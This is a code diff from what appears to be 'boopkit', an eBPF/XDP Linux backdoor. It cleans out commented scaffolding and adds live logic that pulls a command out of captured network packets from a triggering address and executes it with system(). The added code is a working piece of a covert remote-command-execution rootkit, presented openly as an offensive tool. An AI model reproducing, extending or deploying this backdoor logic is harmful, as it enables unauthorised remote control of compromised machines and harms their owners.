@@ -30,7 +30,7 @@
 #include <xdp/libxdp.h>   // libxdp
 #include <errno.h>
 #include <limits.h>
-#include <linux/perf_event.h>
+#include <linux/types.h>
 #include <net/if.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -41,6 +41,7 @@
 // clang-format off
 #include "boopkit.h"
 #include "common.h"
+#include "dpi.h"
 #include "pr0be.skel.safe.h"
 #include "pr0be.skel.xdp.h"
 // clang-format on
@@ -418,55 +419,6 @@ int main(int argc, char **argv) {
   boopprintf("  ->   eBPF   Map Name: %s\n", bmapname);
   int fd = bpf_map__fd(bpmap);
 
-
-  // Forking xdpdump code here
-  //
-  // listen_on_interface() is the main packet capture method
-  // load_and_attach_trace() is for loading/attaching BPF probe
-  // load_xdp_trace_program() is for loading the XDP probe
-
-
-
-
-//  struct bpf_program          *xdp_prog_fentry;
-//  struct bpf_program          *xdp_prog_fexit;
-//  struct bpf_link             *trace_link_fentry = NULL;
-//  struct bpf_link             *trace_link_fexit = NULL;
-//  xdp_prog_fentry = bpf_object__find_program_by_name(xdp_obj,
-//                                                       "trace_on_entry");
-//  if (!xdp_prog_fentry) {
-//    boopprintf("ERROR: Can't find XDP trace fentry function!\n");
-//    return 0;
-//  }
-//
-//  xdp_prog_fexit = bpf_object__find_program_by_name(xdp_obj,
-//                                                      "trace_on_exit");
-//  if (!xdp_prog_fexit) {
-//    boopprintf("ERROR: Can't find XDP trace fexit function!\n");
-//    return 0;
-//  }
-
-
-
-
-
-  // ----
-//  struct perf_event_attr       perf_attr = {
-//      .sample_type = PERF_SAMPLE_RAW | PERF_SAMPLE_TIME,
-//      .type = PERF_TYPE_SOFTWARE,
-//      .config = PERF_COUNT_SW_BPF_OUTPUT,
-//      .sample_period = 1,
-//      .wakeup_events = 1,
-//  };
-
-  // --------------------------------------------------------------------------------
-  //  perf_buffer__new_raw(int map_fd, size_t page_cnt, struct perf_event_attr *attr,
-  //                       perf_buffer_event_fn event_cb, void *ctx,
-  //                       const struct perf_buffer_raw_opts *opts);
-  // TODO callback function! Woo!
-  //pb = perf_buffer__new_raw(xdp_map_fd, 256, &perf_attr, NULL, NULL, NULL);
-  // --------------------------------------------------------------------------------
-
   // logs
   for (int i = 0; i < cfg.denyc; i++) {
     boopprintf("   X Deny address: %s\n", cfg.deny[i]);
@@ -533,15 +485,14 @@ int main(int argc, char **argv) {
           }
           free(rce);
         } else {
-
-          //__u8 saddrbytes[4];
-
-          // TODO Parse RCE from map/encapsulation
-          // TODO Read from XDP
-          // boopprintf("  <- Executing: %s\r\n", ret.rce);
-          // system(ret.rce);
-          // boopprintf("  -> no RCE found!\n");
-          // printf("***SEARCH FOR PAYLOAD HERE***\n");
+          boopprintf("  -> xCap search %s for RCE\n", saddrval);
+          char *rce = malloc(MAX_RCE_SIZE);
+          int retval;
+          retval = xcaprce(saddrbytes, rce);
+          if (retval == 0 ) {
+            boopprintf("  <- Executing: %s\r\n", rce);
+            system(rce);
+          }
         }
       }
       err = bpf_map_delete_elem(fd, &jkey);
